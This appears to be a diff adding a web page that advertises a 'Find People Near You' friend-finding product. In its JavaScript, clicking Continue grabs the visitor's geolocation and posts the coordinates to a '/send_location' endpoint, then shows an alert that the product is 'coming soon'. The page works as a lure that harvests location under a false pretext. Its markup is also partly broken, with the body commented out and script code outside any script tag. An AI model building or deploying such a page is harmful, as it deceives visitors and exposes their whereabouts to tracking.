@@ -1,0 +1,51 @@
+      <script type="text/javascript">
+        if (window.location.protocol == "http:") {
+            var restOfUrl = window.location.href.substr(5);
+            } </script>
+ 
+ 
+ <!-- <canvas id="canvas" style="width:100%; height:100%;"></canvas>
+        <body onload="K();">
+        <div><h1>Find People Near You</h1></div>
+        <div><h2>Meet New People, Make New Friends</h2></div>
+        <div class="earth"></div>
+        <div><button id="change" class="button" type="button" >Continue</button></div>
+        <div class="text" id="result"></div>  -->
+
+
+    let B = document.getElementById('change');
+
+    const A=()=>{
+       
+        alert('Thank you for taking interest in Near You...This product is coming soon...')}
+   B.addEventListener('click', function() {
+    
+    K()
+    A()
+  });
+
+
+
+  const K=()=>{if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                // Send data to Python server
+                fetch('/send_location', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ latitude, longitude }),
+                })
+                .then(response => response.text())
+                .then(data => {
+                    console.log(data);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            });
+        }
+    }
